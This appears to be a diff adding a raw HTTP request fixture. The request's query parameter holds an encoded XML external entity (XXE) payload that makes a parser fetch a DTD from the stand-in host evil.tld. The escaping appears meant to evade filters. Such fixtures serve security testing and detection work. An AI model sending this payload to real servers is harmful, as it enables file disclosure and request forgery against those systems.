@@ -1,0 +1,4 @@
+GET /a?s=\u003C%3Fxml%20version%3D\u00221.0\u0022%3F\u003E\u003C!DOCTYPE%20r%20[\u003C!ENTITY%20x%20SYSTEM%20\u0022http://evil.tld/x.dtd\u0022\u003E]\u003E\u003Cr\u003E\u0026x\u003B\u003C/r\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
